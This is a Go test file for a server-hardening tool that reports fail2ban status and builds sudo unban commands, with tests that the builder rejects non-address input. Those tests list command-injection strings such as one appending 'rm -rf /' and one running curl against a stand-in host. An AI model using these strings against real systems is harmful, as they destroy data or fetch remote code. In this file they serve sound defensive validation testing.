package serverguard

import (
	"strings"
	"testing"
)

func fail2banRunning(t *testing.T, running bool) {
	t.Helper()
	prev := socketExists
	t.Cleanup(func() { socketExists = prev })
	socketExists = func() bool { return running }
}

// The absence of a ban list must never read as servlo saying there are no bans.
func TestFail2banStatus_SaysWhyItCannotListTheBans(t *testing.T) {
	fail2banRunning(t, true)

	got := Fail2banStatus("")
	if !got.Running {
		t.Fatal("fail2ban is running and servlo says it is not")
	}
	if !strings.Contains(got.StatusCommand, "fail2ban-client status sshd") {
		t.Errorf("the status command is %q", got.StatusCommand)
	}
	if !strings.Contains(got.Why, "root") {
		t.Errorf("nothing explains why there is no list: %q", got.Why)
	}
}

// The failure that is actually common is fail2ban not running at all, on a
// server whose SSH password authentication servlo deliberately leaves enabled.
func TestFail2banStatus_OffersToBringItBackWhenItIsNotRunning(t *testing.T) {
	fail2banRunning(t, false)

	got := Fail2banStatus(DefaultJail)
	if got.Running {
		t.Fatal("fail2ban is not running and servlo says it is")
	}
	if len(got.InstallCommands) == 0 {
		t.Error("nothing to run")
	}
	for _, c := range got.InstallCommands {
		if !strings.HasPrefix(c, "sudo ") {
			t.Errorf("a command that needs root is printed without sudo: %q", c)
		}
	}
	if !strings.Contains(got.Why, "password") {
		t.Errorf("the reason does not say why fail2ban matters here: %q", got.Why)
	}
}

func TestUnbanCommand_BuildsWhatToRun(t *testing.T) {
	got, err := UnbanCommand("", "203.0.113.7")
	if err != nil {
		t.Fatal(err)
	}
	if got != "sudo fail2ban-client set sshd unbanip 203.0.113.7" {
		t.Errorf("built %q", got)
	}
	if _, err := UnbanCommand("recidive", "2001:db8::1"); err != nil {
		t.Errorf("an IPv6 address was refused: %v", err)
	}
}

// This text is built to be pasted into a root shell, so anything that is not
// plainly an address does not get to be part of it.
func TestUnbanCommand_RefusesAnythingThatIsNotAnAddress(t *testing.T) {
	for _, bad := range []string{
		"",
		"1.2.3.4; rm -rf /",
		"$(curl evil.example)",
		"`id`",
		"example.com",
		"1.2.3.4 && reboot",
	} {
		if got, err := UnbanCommand("sshd", bad); err == nil {
			t.Errorf("built %q from %q", got, bad)
		}
	}
}

// The jail name reaches the same command line, so it is checked the same way.
func TestUnbanCommand_RefusesAJailNameThatIsNotOne(t *testing.T) {
	for _, bad := range []string{"sshd; reboot", "ssh d", "$(id)", strings.Repeat("a", 65)} {
		if got, err := UnbanCommand(bad, "203.0.113.7"); err == nil {
			t.Errorf("built %q from jail %q", got, bad)
		}
	}
}
